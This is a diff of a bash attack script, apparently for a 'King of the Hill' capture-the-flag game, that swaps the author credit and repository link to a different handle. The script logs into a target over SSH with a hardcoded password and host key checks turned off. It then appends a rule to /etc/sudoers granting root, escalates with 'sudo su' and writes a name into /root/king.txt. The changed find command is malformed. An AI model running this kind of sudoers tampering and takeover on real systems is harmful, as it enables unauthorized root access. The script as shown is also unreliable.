@@ -1,8 +1,8 @@
 #!/bin/bash
 
-# Created by @HaruKey :)
+# Created by @0xVoid :)
 
-# https://github.com/H4ruKey/KOTH
+# https://github.com/0x76OID/KOTH
 
 missing() {
   if ! command -v "$1" >/dev/null 2>&1; then
@@ -31,7 +31,7 @@ bobba_password='-`G)8(t/NDkZ"u^{'
 vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)
 
 sshpass -p "$bobba_password" ssh -o StrictHostKeyChecking=no bobba@"$IP" /bin/bash <<EOF
-  find /etc/sudoers -exec sed -i '/^#includedir \/etc\/sudoers.d/a bobba ALL=(ALL) NOPASSWD: /bin/su' {} \;
+  find /etc/sudoers -exec bash -c 'echo "bobba ALL=(ALL:ALL) ALL" >> /etc/sudoers'
   sleep 1
   sudo su
   echo "$username" >> /root/king.txt
